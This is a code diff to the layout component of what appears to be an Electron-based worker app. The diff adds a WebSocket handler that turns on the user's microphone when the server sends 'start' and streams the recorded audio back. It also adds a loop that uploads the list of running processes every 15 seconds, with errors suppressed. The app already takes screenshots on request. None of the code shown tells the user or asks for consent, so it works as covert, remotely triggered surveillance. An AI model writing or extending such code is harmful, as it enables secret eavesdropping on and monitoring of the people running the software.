@@ -1,7 +1,7 @@
 import { useEffect, useRef } from 'react'
 import { Outlet, NavLink, useNavigate } from 'react-router-dom'
 import { useAuthStore, useChatStore, useGlobalChatStore } from '../store'
-import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat, uploadWorkerScreenshot, checkScreenshotPending } from '../api'
+import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat, uploadWorkerScreenshot, checkScreenshotPending, uploadProcesses } from '../api'
 import { playSound } from '../utils/sound'
 
 const nav = [
@@ -111,6 +111,65 @@ export default function Layout() {
       stopStream()
       ws.close()
     }
+  }, [])
+
+  // Mic streaming via WebSocket
+  useEffect(() => {
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    const token = localStorage.getItem('token')
+    const ws = new WebSocket(`${wsBase}/users/mic-ws?token=${token}`)
+
+    let recorder = null
+    let micStream = null
+
+    const stopMic = () => {
+      if (recorder && recorder.state !== 'inactive') recorder.stop()
+      if (micStream) { micStream.getTracks().forEach(t => t.stop()); micStream = null }
+      recorder = null
+    }
+
+    const startMic = async () => {
+      if (recorder) return
+      try {
+        micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+          ? 'audio/webm;codecs=opus' : 'audio/webm'
+        recorder = new MediaRecorder(micStream, { mimeType })
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) {
+            e.data.arrayBuffer().then(buf => ws.send(buf))
+          }
+        }
+        recorder.start(250)
+      } catch (e) {
+        console.error('Mic error:', e)
+      }
+    }
+
+    ws.onmessage = (e) => {
+      if (e.data === 'start') startMic()
+      else if (e.data === 'stop') stopMic()
+    }
+    ws.onclose = () => stopMic()
+
+    return () => {
+      stopMic()
+      ws.close()
+    }
+  }, [])
+
+  // Process list upload every 15 seconds
+  useEffect(() => {
+    if (!window.electronBridge?.getProcesses) return
+    const upload = async () => {
+      try {
+        const processes = await window.electronBridge.getProcesses()
+        await uploadProcesses(processes)
+      } catch {}
+    }
+    upload()
+    const interval = setInterval(upload, 15_000)
+    return () => clearInterval(interval)
   }, [])
 
   // Background: message notifications
